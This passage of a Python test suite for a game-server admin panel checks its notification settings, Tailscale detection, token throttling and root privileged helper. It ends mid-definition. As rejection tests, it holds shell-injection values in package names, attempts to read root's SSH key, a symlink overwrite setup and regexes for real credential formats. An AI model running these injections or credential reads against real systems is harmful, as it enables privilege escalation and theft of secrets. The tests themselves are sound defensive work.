          and "GoodToken_123" not in _nt_calls[0][0], str(_nt_calls[:1])[:90])
finally:
    N._post = _sv_post

# save_settings must not wipe a configured ntfy channel just because a caller omitted the argument.
_sv_cfg3, _sv_upd3 = N._cfg, N.update_config
try:
    _nt_saved = {}
    N.update_config = lambda fn: fn(_nt_saved)
    _nt_tok = N.encrypt_secret("TESTONLYntfytoken")
    N._cfg = lambda: {"ntfy": {"enabled": True, "server": "https://ntfy.example.com",
                               "topic": "keepme", "token": _nt_tok}}
    N.save_settings(telegram={}, discord={}, events={})          # an older caller: no ntfy kwarg
    check("ntfy save: omitting the ntfy argument KEEPS the configured channel",
          _nt_saved["notifications"]["ntfy"]["topic"] == "keepme"
          and _nt_saved["notifications"]["ntfy"]["token"] == _nt_tok,
          str(_nt_saved["notifications"]["ntfy"]))
    _nt_saved.clear()
    N.save_settings(telegram={}, discord={}, events={},
                    ntfy={"enabled": True, "server": "", "topic": "t", "token": None})
    check("ntfy save: a blank server falls back to the public default",
          _nt_saved["notifications"]["ntfy"]["server"] == N.NTFY_DEFAULT_SERVER)
    check("ntfy save: a None token keeps the stored one",
          _nt_saved["notifications"]["ntfy"]["token"] == _nt_tok)
    _nt_saved.clear()
    N.save_settings(telegram={}, discord={}, events={},
                    ntfy={"enabled": True, "server": "https://n.example", "topic": "t",
                          "token": "TESTONLYnewntfytoken"})
    check("ntfy save: a new token is stored ENCRYPTED, not in the clear",
          "TESTONLYnewntfytoken" not in _nt_saved["notifications"]["ntfy"]["token"]
          and N.decrypt_secret(_nt_saved["notifications"]["ntfy"]["token"]) == "TESTONLYnewntfytoken")
finally:
    N._cfg, N.update_config = _sv_cfg3, _sv_upd3

# ── The Telegram poller ────────────────────────────────────────────────────────────────────────
check("telegram poll: a malformed token returns None without building a URL",
      N.telegram_get_updates("not-a-token") is None)
check("telegram poll: so does an empty one", N.telegram_get_updates("") is None)

# ── "Send test" must explain itself rather than fail silently ─────────────────────────────────
_sv_cfg2 = N._cfg
try:
    N._cfg = lambda: {}
    for _kind, _kw, _want in (("telegram", {}, "bot token"),
                              ("telegram", {"token": "nope"}, "expected format"),
                              ("telegram", {"token": "12345:TESTONLYnotarealtoken00"}, "chat ID"),
                              ("discord", {}, "webhook URL"),
                              ("discord", {"webhook": "https://evil.example/x"}, "Discord webhook URL"),
                              ("ntfy", {}, "topic"),
                              ("ntfy", {"topic": "has space"}, "letters, digits"),
                              ("ntfy", {"topic": "ok", "server": "http://insecure.example"}, "https")):
        _ok, _msg = N.test_send(_kind, **_kw)
        check("test send: %s with %s explains what is missing" % (_kind, list(_kw) or "nothing"),
              _ok is False and _want.lower() in _msg.lower(), _msg[:70])
finally:
    N._cfg = _sv_cfg2

# ── Tailscale address recognition ──────────────────────────────────────────────────────────────
# is_tailscale_ip decides whether the panel treats a host as being on the tailnet, which changes
# how it connects and what it exempts from fail2ban/UFW. A false positive would exempt a PUBLIC
# address from the security rules, so the near-misses matter as much as the hits.
from panel.ops import tailscale_integration as TS

for _h in ("100.64.0.1", "100.115.92.7", "fd7a:115c:a1e0::1",
           "ns106051.taile87e07.ts.net", "box.tail1234.ts.net",
           "BOX.TAILE87E07.TS.NET"):     # MagicDNS names are case-insensitive
    check("tailnet: %r is recognised" % _h, TS.is_tailscale_ip(_h) is True)
# The near-misses. The first three used to answer True: `".taile" in host` is an UNANCHORED
# substring anywhere in the string, and `host.startswith("100.")` is a string prefix rather than
# a range — so a domain somebody else controls was reported as being on the tailnet, and so was
# 100.0.0.1, which is a PUBLIC address outside Tailscale's 100.64.0.0/10 CGNAT block.
# "host.taile87e07.example" was in the recognised list above and should never have been: a
# MagicDNS name always ends .ts.net.
for _h in ("10.0.0.1", "192.168.1.5", "1.100.0.1", "203.0.113.9", "example.ts.net.evil.com",
           "fd7b:115c::1", "", None, "100abc.example.com",
           "host.taile87e07.example", "evil.tailed-hosting.example",
           "100.telemetry.example.com", "100.0.0.1", "100.128.0.1"):
    check("tailnet: %r is NOT taken for a tailnet address" % (_h,), TS.is_tailscale_ip(_h) is False)

# get_magic_url: the port is omitted for the standard ones and appended otherwise, and there is no
# URL at all when the node has no MagicDNS name (rather than a broken "https://None").
_sv_info = TS.get_tailscale_info
try:
    class _Info(object):
        def __init__(self, dns): self.dns_name, self.tailscale_ips, self.peers = dns, [], []
    TS.get_tailscale_info = lambda *a, **k: _Info("box.taile87e07.ts.net")
    eq("magic url: no port for https", TS.get_magic_url(), "https://box.taile87e07.ts.net")
    eq("magic url: 443 is left off", TS.get_magic_url(443), "https://box.taile87e07.ts.net")
    eq("magic url: 80 is left off too", TS.get_magic_url(80), "https://box.taile87e07.ts.net")
    eq("magic url: any other port is appended", TS.get_magic_url(5000),
       "https://box.taile87e07.ts.net:5000")
    eq("magic url: the protocol is honoured", TS.get_magic_url(8080, "http"),
       "http://box.taile87e07.ts.net:8080")
    TS.get_tailscale_info = lambda *a, **k: _Info("")
    eq("magic url: no MagicDNS name means no URL, not a broken one", TS.get_magic_url(), None)
finally:
    TS.get_tailscale_info = _sv_info

check("tailnet: the panel can name the OS user it runs as", bool(TS._current_os_user()))

# ── Test fixtures must not be shaped like real credentials ────────────────────────────────────
# A synthetic Telegram token written in the EXACT real shape (9 digits : 35 chars) tripped GitHub
# secret scanning and opened an alert against this repo. A false positive there is not harmless:
# it trains whoever reads that dashboard to wave the next one through. The panel's own patterns
# are far looser than the real formats, so a fixture can stay valid AND be obviously fake.
import re as _re_fx
_fixture_shapes = [
    ("Telegram bot token", r"\b\d{8,10}:[A-Za-z0-9_-]{35}\b"),
    ("Discord webhook", r"https://discord\.com/api/webhooks/\d{17,19}/[A-Za-z0-9_-]{60,}"),
    ("GitHub token", r"\bgh[pousr]_[A-Za-z0-9]{36}\b"),
]
# The suite is several files now; a gate reading only one of them would stop covering the
# fixtures in the others while still passing.
_own_files = sorted(_pl.Path(_UNIT_ROOT, "tests").rglob("*.py"))
_own = "\n".join(open(_p, encoding="utf-8").read() for _p in _own_files)
# ...and this one is "no fixture anywhere looks like a real credential", which an empty sweep
# satisfies trivially. The suite is several files now, so the count is the thing to assert.
check("sweep: the tests/**/*.py scan found the suite's own source", len(_own_files) >= 10,
      "%d files — the credential-shape checks below would pass vacuously" % len(_own_files))
for _label, _pat in _fixture_shapes:
    _hits = _re_fx.findall(_pat, _own)
    check("fixtures: no test value is shaped like a real %s" % _label, not _hits,
          "%s" % (_hits[:1],))

# ── Supported-release claim vs what CI actually proves ──────────────────────────────────────────
# The README tells people which Ubuntu releases the panel runs on; the CI matrix is the only thing
# that proves it. These drift apart silently — a release added to one and not the other is
# invisible until somebody installs onto it and finds out. Assert the claim and the proof agree.
# Parsed with regex rather than PyYAML so this gate needs no dependency CI doesn't already install.
_repo = _pl.Path(_UNIT_ROOT)
_ci_yml = (_repo / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
_readme = (_repo / "README.md").read_text(encoding="utf-8")
_ci_pairs = set(zip(
    [m for m in _re_fx.findall(r"- os: ubuntu-([0-9]{2}\.[0-9]{2})", _ci_yml)],
    [m for m in _re_fx.findall(r"\n\s+python: \"([0-9]+\.[0-9]+)\"", _ci_yml)],
))
_ci_releases = {r for r, _ in _ci_pairs}
_readme_line = next((ln for ln in _readme.splitlines() if "LTS** for the panel" in ln), "")
_readme_releases = set(_re_fx.findall(r"([0-9]{2}\.[0-9]{2})", _readme_line))
check("supported releases: CI matrix has at least one entry", bool(_ci_releases), str(_ci_pairs))
eq("supported releases: README lists exactly what CI tests",
   sorted(_readme_releases), sorted(_ci_releases))
# Each release must be paired with the Python IT ships — testing 26.04 on 3.12 would prove nothing
# about the interpreter people will actually run the panel under.
_EXPECTED_PY = {"22.04": "3.10", "24.04": "3.12", "26.04": "3.14"}
_wrong = sorted("%s->py%s (ships %s)" % (r, py, _EXPECTED_PY[r])
                for r, py in _ci_pairs if r in _EXPECTED_PY and _EXPECTED_PY[r] != py)
check("supported releases: each is tested on the Python that release ships", not _wrong, str(_wrong))


# A chat-bot command can stop a game server or update the panel. Every one used to be recorded
# with actor=None — i.e. "system" — so the audit log showed the effect and nothing about the
# cause. The origin string is what makes a bot-initiated action attributable.
from panel.services.bots.commands import _bot_origin
eq("bot origin: telegram sender by username", _bot_origin("telegram", {"username": "fred", "id": 7}), "telegram:fred")
eq("bot origin: falls back to the numeric id", _bot_origin("telegram", {"id": 4242}), "telegram:4242")
eq("bot origin: discord is labelled as discord", _bot_origin("discord", {"username": "ann"}), "discord:ann")
eq("bot origin: an absent sender is still recorded, not blank",
   _bot_origin("telegram", None), "telegram:unknown")
check("bot origin: capped so a hostile display name can't flood the audit column",
      len(_bot_origin("discord", {"username": "x" * 500})) <= 64)


# ── API-token brute-force throttle ──────────────────────────────────────────────────────────────
# /login has been throttled for years; the bearer path — the panel's OTHER way in — had nothing.
from panel.security import auth as _authmod
_authmod._TOKEN_FAILS.clear()
for _i in range(_authmod.TOKEN_MAX_FAILS - 1):
    _authmod._token_auth_record("10.0.0.9", ok=False)
check("token throttle: under the limit an IP is still allowed to try",
      not _authmod._token_auth_blocked("10.0.0.9"))
_authmod._token_auth_record("10.0.0.9", ok=False)
check("token throttle: the limit blocks further attempts",
      _authmod._token_auth_blocked("10.0.0.9"))
check("token throttle: a DIFFERENT IP is unaffected",
      not _authmod._token_auth_blocked("10.0.0.10"))
# A success must clear the counter, or one bad script would lock out the good token behind it.
_authmod._token_auth_record("10.0.0.9", ok=True)
check("token throttle: a successful auth clears the counter",
      not _authmod._token_auth_blocked("10.0.0.9"))
# Entries must age out, or the map grows one row per IP that ever mistyped a token.
_authmod._TOKEN_FAILS["10.0.0.11"] = [_time.time() - (_authmod.TOKEN_WINDOW + 5)] * 50
_authmod._token_auth_blocked("10.0.0.12")          # any call prunes
check("token throttle: stale IPs are pruned, so the map cannot grow forever",
      "10.0.0.11" not in _authmod._TOKEN_FAILS, str(list(_authmod._TOKEN_FAILS))[:60])
_authmod._TOKEN_FAILS.clear()


# ── Deprecations the panel must be able to hear ────────────────────────────────────────────────
# app.py used to open with `filterwarnings("ignore", category=DeprecationWarning)` — no module, no
# message, never lifted. Two consequences, both proven before this was changed:
#
#   1. It did NOT silence what its comment claimed. EventletDeprecationWarning subclasses Warning,
#      not DeprecationWarning, so eventlet's banner printed on every single start regardless.
#   2. It DID silence everything else, and it won the race against the operator: running the panel
#      under `-W always::DeprecationWarning` heard nothing, because a filterwarnings() call inserts
#      at the FRONT of the filter list and so overrides -W and PYTHONWARNINGS.
#
# What was hidden: 22 calls to datetime.utcnow(), deprecated in 3.12 and scheduled for removal —
# exactly the class of warning that predicts the next Python breaking the panel.
import re as _re
import shutil as _shutil
import subprocess as _sp
import tempfile as _tempfile
import time as _time
from panel.core import clock as _clock
from datetime import datetime as _dtm, timezone as _tz

_n = _clock.utcnow()
check("clock.utcnow() is naive, so it can go straight into a db.DateTime column",
      _n.tzinfo is None, repr(_n.tzinfo))
check("clock.utcnow() still reads UTC, like datetime.utcnow() did",
      abs((_dtm.now(_tz.utc).replace(tzinfo=None) - _n).total_seconds()) < 5)
_a = _clock.aware_utcnow()
check("clock.aware_utcnow() is timezone-aware, for libraries that require it",
      _a.tzinfo is not None and _a.utcoffset().total_seconds() == 0, repr(_a.tzinfo))

# Source gate: the deprecated spellings must not come back. A single `datetime.utcnow()` reintroduced
# in a later PR would be invisible again the day CPython removes it.
_root = _UNIT_ROOT
# Split so these patterns do not match their own source line — this file is inside the walk.
_BAD_NOW = r"\.utc" + r"now\s*\("
_BAD_TS = r"\.utc" + r"fromtimestamp\s*\("
_offenders = []
for _dirpath, _dirnames, _files in os.walk(_root):
    _dirnames[:] = [d for d in _dirnames
                    if d not in {".git", ".venv", "venv", "__pycache__", "node_modules", "data"}]
    for _f in _files:
        if not _f.endswith(".py") or _f == "clock.py":
            continue
        _fp = os.path.join(_dirpath, _f)
        for _i, _line in enumerate(open(_fp, encoding="utf-8", errors="replace"), 1):
            _code = _line.split("#", 1)[0]          # a comment may legitimately name the old spelling
            if "clock" in _code:                    # clock.utcnow() is the replacement, not the target
                continue
            # The deprecated spellings are attribute access on datetime: datetime.utcnow(),
            # _dt.utcnow(), datetime.datetime.utcfromtimestamp(). A bare utcnow() is clock's.
            if _re.search(_BAD_NOW, _code) or _re.search(_BAD_TS, _code):
                _offenders.append("%s:%d" % (os.path.relpath(_fp, _root), _i))
check("no module calls the datetime UTC helpers that are scheduled for removal",
      not _offenders, ", ".join(_offenders[:5]))

# Source gate: no unscoped DeprecationWarning suppression anywhere. `module=` or `message=` is fine;
# a bare category filter silences the whole process.
_blanket = []
for _f in ("app.py", "auth.py", "models.py", "ssh_manager.py", "system_ops.py", "notifications.py"):
    for _fp1 in _modfiles(_f):
     for _i, _line in enumerate(open(_fp1, encoding="utf-8"), 1):
        if "filterwarnings" in _line and "DeprecationWarning" in _line \
                and "module=" not in _line and "message=" not in _line and not _line.lstrip().startswith("#"):
            _blanket.append("%s:%d" % (_f, _i))
check("no module installs a process-wide DeprecationWarning filter",
      not _blanket, ", ".join(_blanket))

# Behavioural proof, not just a grep: with the operator asking for DeprecationWarnings on the command
# line, importing app must leave them audible. This is the check that actually failed before the fix.
_probe = (
    "import sys, warnings; sys.path.insert(0, %r);"
    "import app;"
    "heard=[];"
    "warnings.showwarning=lambda m,c,f,l,file=None,line=None: heard.append(c.__name__);"
    "warnings.warn('probe', DeprecationWarning);"
    "print('HEARD' if heard else 'DEAF')" % _root
)
# skip(), not check(..., True, "skipped: ..."). The handler set _heard = True on ANY exception —
# including the 120s TimeoutExpired and any OSError — which is verbatim the pattern skip()'s own
# docstring forbids: "a green line for a check that never executed". Proven by raising before the
# subprocess: PASS, 1888/1888, rc=0, no SKIP reported. The except is narrowed to what it claims to
# be for (a sandbox that forbids subprocess), so a timeout or a crash is a real failure again.
_probe_ran, _heard, _detail = True, False, ""
try:
    _out = _sp.run([sys.executable, "-W", "always::DeprecationWarning", "-c", _probe],
                   capture_output=True, text=True, timeout=120, cwd=_root)
    _heard = "HEARD" in _out.stdout
    _detail = (_out.stdout.strip()[-60:] + " " + _out.stderr.strip()[-120:])
except (OSError, ValueError) as _e:   # no subprocess at all in this sandbox — not a code failure
    _probe_ran, _detail = False, repr(_e)
if _probe_ran:
    check("importing app leaves -W always::DeprecationWarning working", _heard, _detail)
else:
    skip("importing app leaves -W always::DeprecationWarning working", _detail)

# eventlet's own banner IS silenced now — by message, since it is not a DeprecationWarning at all.
_quiet = _sp.run([sys.executable, "-c", "import sys; sys.path.insert(0, %r); import app" % _root],
                 capture_output=True, text=True, timeout=120, cwd=_root)
check("eventlet's deprecation banner no longer prints on every start",
      "Eventlet is deprecated" not in _quiet.stderr, _quiet.stderr.strip()[:120])

# ── The privileged helper: verbs instead of shell strings ──────────────────────────────────────
# The panel escalates local work as `sudo bash -c '<command>'`, and a sudoers rule permitting
# /bin/bash is exactly NOPASSWD:ALL — so the grant cannot be narrowed while a shell string crosses
# the boundary. privileged.py names each operation as a verb with separated arguments;
# tools/panel-helper is the root-owned end that re-validates them and execs a fixed argv.
import importlib.machinery as _machinery
import importlib.util as _ilu
from panel.security import privileged as _priv
# (duplicate import removed in the split: import shutil as _shutil already bound above)
import tarfile as _tarfile
# (duplicate import removed in the split: import tempfile as _tempfile already bound above)

_helper_path = os.path.join(_root, "tools", "panel-helper")
_spec = _ilu.spec_from_loader("panel_helper", _machinery.SourceFileLoader("panel_helper", _helper_path))
_helper = _ilu.module_from_spec(_spec)
_spec.loader.exec_module(_helper)

# Sample arguments per verb. Every verb must appear here — a new verb with no sample is a gap in
# the parity check below, so the test fails rather than silently skipping it.
_VERB_SAMPLES = {
    "ufw-status": ["numbered"],
    "ufw-enable": [],
    "ufw-default": ["deny", "incoming"],
    "ufw-allow-port": ["27015", "Game"],
    "ufw-allow-proto-port": ["tcp", "27015", "Game"],
    "ufw-limit-port": ["22/tcp"],
    "ufw-allow-iface": ["tailscale0"],
    "ufw-delete-allow-port": ["22/tcp"],
    "ufw-delete-allow-proto-port": ["udp", "27015"],
    "ufw-delete-limit-port": ["22/tcp"],
    "ufw-delete-allow-app": ["OpenSSH"],
    "ufw-allow-from-port": ["10.0.0.0/8", "27015", "udp", "lan only"],
    "ufw-delete-allow-from-port": ["10.0.0.0/8", "27015", "udp"],
    "ufw-deny-ip": ["203.0.113.5", "panel-autoblock"],
    "ufw-delete-deny-ip": ["203.0.113.5"],
    "ufw-delete-num": ["3"],
    "f2b-status": [],
    "f2b-status-jail": ["sshd"],
    "f2b-unban": ["sshd", "203.0.113.5"],
    "f2b-reload": [],
    "service-restart": ["ssh"],
    "panel-restart": ["2"],
    "tailscale-set-operator": ["ubuntu"],
    "tailscale-serve": ["serve", "modern", "/", "http", "5000"],
    "service-reload": ["fail2ban"],
    "service-enable-now": ["fail2ban"],
    "service-disable-now": ["cups"],
    "apt-update": [],
    "apt-full-upgrade": ["phased"],
    "apt-upgrade": [],
    "apt-autoremove": [],
    "apt-install": ["curl", "lib32gcc-s1", "libsdl2-2.0-0:i386"],
    "apt-add-repo": ["universe"],
    "dpkg-add-arch": ["i386"],
    "apt-any-running": [],
    "apt-upgrade-running": [],
    "dpkg-lock-held": [],
    "reboot": [],
    "journal": ["ssh", "400"],
    "log-tail": ["fail2ban", "4000"],
    "os-update-log": [],
    "crontab-list": ["codserver"],
    "user-create": ["codserver"],
    "user-lock-password": ["codserver"],
    "user-delete": ["codserver"],
    "user-delete-force": ["codserver"],
    "user-kill-processes": ["codserver"],
    "user-remove-home": ["codserver"],
    "write-file": ["fail2ban-jail-local"],
    "sysctl-reload": ["tailscale"],
    "sshd-backup-dropin": [],
    "sshd-restore-dropin": [],
    "sshd-socket-backup": [],
    "sshd-socket-restore": [],
    "sshd-socket-discard": [],
    "sshd-socket-active": [],
    "systemd-daemon-reload": [],
    "sshd-discard-backup": [],
    "sshd-validate": [],
    "listening-sockets": [],
    "f2b-set-sshd-ports": ["2222,22"],
    "reboot-delayed": [],
    "pro-status": [],
    "pro-attach": ["A1b2C3d4E5f6G7h8"],
    "pro-service": ["enable", "esm-infra"],
    "pro-detach": [],
    "renice-users": ["-1", "codserver"],
    "set-timezone": ["America/Chicago"],
    "sshd-effective-config": [],
    "disk-free": ["/home"],
    "content-dir-create": ["gmodcontent"],
    "content-game-present": ["gmodcontent", "cstrike"],
    "content-script-present": ["gmodcontent", "cssserver"],
    "content-game-remove": ["gmodcontent", "cstrike", "cssserver"],
    "content-cron-write": ["gmodcontent"],
    "content-cron-remove": ["gmodcontent"],
    "content-grant-read": ["gmodcontent", "gmodcontent", "gmodserver", "cstrike"],
    "gmod-mount-read": ["gmodserver"],
    "f2b-log-lines": ["2026-09-02"],
    "sshd-set-directive": ["ClientAliveInterval", "300"],
    "create-swapfile": [],
    "npm-install-global": ["gamedig"],
    "journal-cron": [],
    "tailscale-up-key": ["tskey-auth-abc123def", "yes", "10.0.0.0/24", "tag:server"],
    "tailscale-up-login": ["yes", "-"],
    "os-update-run": [],
    "panel-db-repair": [],
    "panel-restore": [],
    "panel-self-update": ["-", "-"],
    "tailscale-install": [],
    "game-backup-read": ["ubuntu", "csgoserver-2026-01-01.tar.gz"],
    "game-file-read": ["codserver", "serverfiles/cfg/server.cfg"],
    "game-dir-tar": ["codserver", "serverfiles/addons"],
    "lgsm-discover": [],
    "lgsm-command": ["gmodserver", "gmodserver", "details", "-", "no"],
    "gameuser-group": ["gmodserver"],
    "content-scan": ["cstrike", "hl2"],
}
check("privileged: every verb has a sample (new verbs cannot skip the parity check)",
      set(_VERB_SAMPLES) == set(_priv.verbs()),
      "panel-only=%s helper-only=%s" % (sorted(set(_priv.verbs()) - set(_VERB_SAMPLES)),
                                        sorted(set(_VERB_SAMPLES) - set(_priv.verbs()))))
check("privileged: the helper knows exactly the same verbs as the panel",
      sorted(_helper.VERBS) == _priv.verbs(),
      "helper=%s panel=%s" % (sorted(_helper.VERBS)[:3], _priv.verbs()[:3]))

# THE anti-drift gate. The helper deliberately keeps its own copy of the table — it must not import
# panel code, because root running panel-writable code is the thing this is trying to prevent. The
# copies are only safe while something checks they agree.
_drift = []
for _v, _a in _VERB_SAMPLES.items():
    if _v not in _helper.VERBS or _v not in _priv.verbs():
        continue
    _hv = _helper.VERBS[_v][1](_helper.validate(_v, _a))
    _pv = _priv.tool_argv(_v, _a)
    if _hv != _pv:
        _drift.append("%s: helper=%r panel=%r" % (_v, _hv, _pv))
check("privileged: helper and panel build an identical argv for every verb",
      not _drift, "; ".join(_drift[:2]))

# ── Per-process CPU sampling reads the RIGHT /proc/<pid>/stat fields ──────────────────────────
# The samplers split a stat line on the LAST ')' (comm can contain spaces and parens) and then sum
# two fields. They summed b[13]+b[14] = stime + CUTIME. cutime only counts REAPED CHILDREN, and a
# game server spends almost all its time in USER time, so every game reported ~0% CPU however hard
# it was working — a plausible small number rather than a visible error, which is why it survived.
# awk's split(s, b, " ") drops the leading blank, so after the comm b[1] is STATE and utime lands
# at 12, stime at 13.
#
# Asserted against a synthetic line with DISTINCT values in every position, so an off-by-one cannot
# coincide with the right answer, and by running the real awk expression the code builds.
_STAT_FIELDS = ["R", "222", "333", "444", "555", "666", "777", "888", "999", "1010", "1111",
                "70000",   # b[12] utime
                "3000",    # b[13] stime
                "500",     # b[14] cutime
                "60"]      # b[15] cstime
_STAT_LINE = "4242 (my game (server)) " + " ".join(_STAT_FIELDS)
_awk_prog = ("{n=split($0,a,\")\"); split(a[n],b,\" \"); print %s}" % _sm_core._STAT_JIFFIES_EXPR)
_jiff = _sub.run(["awk", _awk_prog], input=_STAT_LINE, capture_output=True, text=True)
check("metrics: the jiffie expression sums utime+stime, not stime+cutime",
      _jiff.stdout.strip() == "73000",
      "got %r from %r (utime+stime=73000; stime+cutime would be 3500)"
      % (_jiff.stdout.strip(), _sm_core._STAT_JIFFIES_EXPR))
check("metrics: ...and a comm containing spaces and parens does not shift the fields",
      _sub.run(["awk", _awk_prog], input="1 (weird ) name) " + " ".join(_STAT_FIELDS),
               capture_output=True, text=True).stdout.strip() == "73000")
# Both samplers must use it — the per-game one and the batched per-host one.
check("metrics: the batched host sampler uses the same expression",
      _sm_core._STAT_JIFFIES_EXPR in (_sm_core._JIFFIES_BY_USER % "GJA"))

# ── The helper must refuse uid 0, wherever a name reaches it ──────────────────────────────────
# USERNAME_RE accepts "root", and nothing downstream asked WHO the name was. The download verbs'
# whole safety argument is the credential drop — and setgid(0)/setuid(0) are no-ops when you are
# already root, while the self-check `getuid() != pw.pw_uid` compares 0 with 0 and passes. So
# `game-file-read root .ssh/id_rsa` read /root/.ssh/id_rsa AS ROOT, through the code path whose
# docstring explains why reading as root must never happen. The same name reached `userdel -r`,
# `pkill -9 -u`, `crontab -u … -l` and `usermod -aG`.
_uid0_verbs = [("game-file-read", ["root", ".ssh/id_rsa"]), ("game-dir-tar", ["root", "./"]),
               ("game-backup-read", ["root", "x.tar.gz"]), ("crontab-list", ["root"]),
               ("user-delete", ["root"]), ("user-delete-force", ["root"]),
               ("user-kill-processes", ["root"]), ("user-remove-home", ["root"]),
               ("user-lock-password", ["root"]), ("renice-users", ["-1", "root"]),
               ("content-grant-read", ["root", "root", "somegmod", "cstrike"]),
               ("content-cron-write", ["root"]), ("gmod-mount-read", ["root"]),
               ("tailscale-set-operator", ["root"])]
_uid0_through = []
for _v, _a in _uid0_verbs:
    try:
        _helper.validate(_v, _a)
        _uid0_through.append(_v)
    except Exception:
        pass
check("helper: no verb accepts a uid-0 account", not _uid0_through,
      "still accepted: %s" % _uid0_through)
# ...and the PANEL's copy of the table must refuse the same names. It did not: twenty slots still
# held _username, so `remote_command("user-delete", ["root"])` rendered `userdel -r root` and sent
# it. Locally the helper is the second check; a REMOTE host has no helper, so this copy is the
# only one there is. The argv-comparison gate above cannot see this — every content verb builds []
# on both sides, so identical argv says nothing about which names were let through.
_uid0_panel = []
for _v, _a in _uid0_verbs:
    try:
        _priv.check_args(_v, _a)
        _uid0_panel.append(_v)
    except Exception:
        pass
check("privileged: the panel's table refuses a uid-0 account everywhere the helper does",
      not _uid0_panel, "still accepted: %s" % _uid0_panel)
# The general form, so a verb added later cannot drift the same way: for EVERY verb and every
# argument slot, if the helper refuses "root" there, the panel must too.
_slot_drift = []
for _v in sorted(_helper.VERBS):
    if _v not in _priv.verbs():
        continue
    _hs, _ps = _helper.VERBS[_v][0], _priv.verb_validators(_v)
    for _i, (_hc, _pc) in enumerate(zip(_hs, _ps)):
        _hc = _hc.check if isinstance(_hc, _helper.Rest) else _hc
        _pc = _pc.check if isinstance(_pc, _priv.Rest) else _pc
        def _takes(_f):
            try:
                _f("root")
                return True
            except Exception:
                return False
        if not _takes(_hc) and _takes(_pc):
            _slot_drift.append("%s arg%d" % (_v, _i + 1))
check("privileged: no argument slot is stricter in the helper than in the panel",
      not _slot_drift, "helper refuses 'root' but the panel does not at: %s" % _slot_drift[:6])
# The remote grant renders `usermod -aG <group> <user>` from a group name READ OFF THE HOST. The
# helper checks it against the content user's real primary group; the remote form cannot, so the
# groups that hand out privilege are refused by name.
_grp_ok = _priv.remote_command("content-grant-read", ["cu", "cu", "gm", "cstrike"])
_grp_bad = []
for _g in ("root", "sudo", "wheel", "docker", "shadow"):
    try:
        _priv.remote_command("content-grant-read", ["cu", _g, "gm", "cstrike"])
        _grp_bad.append(_g)
    except Exception:
        pass
check("privileged: the remote content grant refuses a privileged group", not _grp_bad,
      "rendered usermod -aG for: %s" % _grp_bad)
check("privileged: ...and still renders the real one", "usermod -aG cu gm" in _grp_ok, _grp_ok[:60])
check("helper: _game_home_path refuses uid 0 even if a name got past the validator",
      _helper._game_home_path("root", ".ssh/id_rsa") == (None, None),
      repr(_helper._game_home_path("root", ".ssh/id_rsa")))
# A uid FLOOR would be the tidier rule and is the wrong one: install.sh creates the panel's own
# account with `useradd --system`, so the panel user is legitimately uid < 1000 and is the argument
# to tailscale-set-operator. Only uid 0 has no legitimate caller.
_sys_name = next((_p.pw_name for _p in __import__("pwd").getpwall() if 0 < _p.pw_uid < 1000), None)
if _sys_name:
    try:
        _helper.validate("tailscale-set-operator", [_sys_name])
        _sys_why = ""
    except Exception as _sys_exc:
        _sys_why = repr(_sys_exc)
    check("helper: a NON-root system account (uid<1000) is still accepted", not _sys_why,
          "refused %s, which is the shape of the panel's own user: %s" % (_sys_name, _sys_why))

# ── The offline DB repair runs as ROOT and must not be steerable through a symlink ────────────
# db_maintenance.repair() is exec'd as root by panel-helper's panel-db-repair. Both paths it
# touches live in the panel's own data/ directory, which the panel user owns: os.path.exists()
# follows links, shutil.copy2() opens its DESTINATION "wb" and writes THROUGH one, and `backup` is
# just `<db_path>.backup`. Aim panel.db at a root-owned file, put a healthy SQLite database (which
# can carry any bytes you like inside a TEXT value) at panel.db.backup, and root overwrote that
# file — the rebuild branch fails first on a non-database target, which is what routes execution
# to the copy. Driven for real against a sandbox, not asserted from the source text.
import sqlite3 as _dbr_sqlite                                                      # noqa: E402
import db_maintenance as _dbr                                                      # noqa: E402

_dbr_tmp = _tempfile.mkdtemp(prefix="dbrepair-sym-")
_dbr_target = os.path.join(_dbr_tmp, "target.txt")
_dbr_db = os.path.join(_dbr_tmp, "panel.db")
_dbr_bak = _dbr_db + ".backup"
with open(_dbr_target, "w", encoding="utf-8") as _fh:
    _fh.write("ORIGINAL ROOT-OWNED CONTENT")
_dbr_c = _dbr_sqlite.connect(_dbr_bak)
_dbr_c.execute("create table t(x)")
_dbr_c.execute("insert into t values('ssh-ed25519 AAAAPAYLOAD attacker')")
_dbr_c.commit()
_dbr_c.close()
os.symlink(_dbr_target, _dbr_db)
_dbr_ok, _dbr_msg = _dbr.repair(path=_dbr_db, backup=_dbr_bak)
check("db repair: refuses a symlinked database path", _dbr_ok is False, _dbr_msg)
# Read BYTES: if the guard ever fails, what lands here is a SQLite file, and decoding it as UTF-8
# raises out of the module and takes the rest of the suite with it instead of failing this check.
with open(_dbr_target, "rb") as _fh:
    _dbr_after = _fh.read()
check("db repair: ...and the symlink's target is untouched",
      _dbr_after == b"ORIGINAL ROOT-OWNED CONTENT", repr(_dbr_after[:60]))
# It must still repair a genuinely corrupt database, or the guard has broken the feature.
os.remove(_dbr_db)
with open(_dbr_db, "wb") as _fh:
    _fh.write(b"this is not a sqlite database at all")
_dbr_ok2, _dbr_msg2 = _dbr.repair(path=_dbr_db, backup=_dbr_bak)
check("db repair: a real corrupt database is still restored", _dbr_ok2 is True, _dbr_msg2)
check("db repair: ...to a healthy file", _dbr.integrity_check(_dbr_db)[0], "not healthy")
check("db repair: ...leaving no .restoring temp behind",
      not os.path.exists(_dbr_db + ".restoring"))


# ── The root dependency install must not take package names from a panel-writable file ────────
# install_game_dependencies interpolates its package list BARE into a pipeline it runs with
# sudo=True — twice, the batch install and the per-package retry. The list comes from
# lgsm_data.deps(), which parses data/lgsm/<distro>.csv by splitting on commas and keeping
# whatever lies between them. _looks_like() guards the FETCH path only; a cache file already on
# disk is read straight back, and data/lgsm/ is inside the panel's own data directory. So
# `cod,libstdc++5:i386 $(id > /tmp/pwned)` reached a root shell intact.
import panel.services.lgsm_data as _ld                                             # noqa: E402
from panel.ops.ssh_manager import hosts as _dep_hosts                               # noqa: E402

_ld._mem.clear()
_o_ld_text = _ld._text
_o_dep_run, _o_dep_slug = _dep_hosts._core.run_command, _dep_hosts.host_os_slug
_dep_seen = {}
try:
    _ld._text = lambda name, allow_fetch=True: (
        "all,curl\ncod,libstdc++5:i386 $(id > /tmp/pwned)\nx,`whoami`\ny,a;b\n")
    _dep_hosts._core.run_command = lambda s, c, **k: (_dep_seen.update(cmd=c, kw=k), ("", "", 0))[1]
    _dep_hosts.host_os_slug = lambda s: "ubuntu-24.04"

    class _DepSrv:
